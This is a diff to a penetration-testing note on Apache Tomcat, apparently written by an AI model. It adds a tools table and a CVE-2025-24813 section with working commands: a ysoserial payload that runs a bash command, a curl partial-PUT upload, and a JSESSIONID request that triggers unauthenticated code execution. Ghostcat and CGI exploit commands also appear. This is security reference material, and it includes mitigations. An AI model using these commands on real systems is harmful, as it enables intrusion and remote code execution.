@@ -1,3 +1,5 @@
+# Tomcat
+
 #Tomcat #ApacheTomcat #Java #webapp #webservices
 
 ## What is Tomcat?
@@ -9,6 +11,19 @@ Apache Tomcat — open-source Java servlet container and web server. Implements 
 - Port: **TCP 8005** — shutdown command port
 - Manager app: `/manager/html` and `/manager/text`
 - Host Manager: `/host-manager/html`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Version, `http-title`, AJP (8009) detection, `tomcat-headers` |
+| [[Tools/File Transfer/cURL\|cURL]] | Manager `text` API, WAR deploy, CVE-2025-24813 partial-PUT upload |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `tomcat_mgr_login`/`tomcat_mgr_upload`, `tomcat_ghostcat` |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute force Manager HTTP-basic auth |
+| [[Tools/Scanning/gobuster\|gobuster]] | Enumerate deployed apps / paths |
+| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Serialized gadget for the CVE-2025-24813 session-deserialization RCE |
 
 ---
 
@@ -154,6 +169,28 @@ run
 python3 exploit.py <target> -p 8009 -f WEB-INF/web.xml
 ```
 
+### CVE-2025-24813 — Partial-PUT Deserialization RCE (unauth)
+
+Disclosed 2025-03-10, exploited within ~24h. Path-equivalence flaw in the default servlet's **partial PUT** handling: when the default servlet is writable (`readonly=false`) and partial PUT is enabled (default), an attacker `PUT`s a serialized Java payload as a file, then triggers its **deserialization** by requesting it as a session — RCE. Needs **file-based session persistence** and a deserialization gadget on the classpath.
+
+**Conditions:** default servlet `readonly=false` (not default) + `allowPartialPut=true` (default) + `PersistentManager` with `FileStore` + a gadget library. Affected: 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2 (fixed 9.0.99 / 10.1.35 / 11.0.3).
+
+```bash
+# 1. Upload the serialized gadget via a partial PUT (Content-Range triggers the partial path;
+#    the leading dot exploits the path-equivalence bug so it lands as a .session file)
+ysoserial CommonsCollections6 'bash -c {echo,<b64>}|{base64,-d}|bash' > payload.session
+curl -s http://<target>:8080/uploads/payload.session \
+  -X PUT -H "Content-Range: bytes 0-/9999" --data-binary @payload.session
+
+# 2. Trigger deserialization: request with a JSESSIONID matching the uploaded filename
+curl -s http://<target>:8080/ -H "Cookie: JSESSIONID=.payload"
+
+# Public PoCs automate both steps:
+#   https://github.com/absholi7ly/POC-CVE-2025-24813
+```
+
+> [!note] Exploitable only with the non-default `readonly=false` **and** file-based sessions **and** a classpath gadget — but all three are common in real deployments, and it's unauthenticated. Mitigate: `readonly=true` or `allowPartialPut=false`.
+
 ### CVE-2019-0232 — CGI RCE (Windows, enableCmdLineArguments)
 
 Affects Windows Tomcat with `enableCmdLineArguments=true` in CGI config.
@@ -171,7 +208,8 @@ curl "http://<target>:8080/cgi-bin/script.bat?&dir"
 | Default/weak manager credentials | WAR upload → RCE |
 | Manager app exposed to network | Brute force attack surface |
 | AJP connector enabled (8009) | Ghostcat file read/RCE |
-| Old Tomcat version | Multiple known CVEs |
+| Default servlet `readonly=false` + partial PUT + file sessions | CVE-2025-24813 unauth deserialization RCE |
+| Old Tomcat version (< 9.0.99 / 10.1.35 / 11.0.3) | CVE-2025-24813 and other known CVEs |
 | Shutdown port 8005 accessible | Remote shutdown |
 | Verbose error pages | Version and path disclosure |
 
@@ -188,3 +226,10 @@ curl "http://<target>:8080/cgi-bin/script.bat?&dir"
 | Ghostcat check | `nmap -p 8009 host` |
 | Read web.xml (Ghostcat) | `python3 exploit.py host -p 8009 -f WEB-INF/web.xml` |
 | MSF WAR upload | `msf: exploit/multi/http/tomcat_mgr_upload` |
+| CVE-2025-24813 (partial-PUT RCE) | `PUT` serialized `.session` w/ `Content-Range` → request `Cookie: JSESSIONID=.payload` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
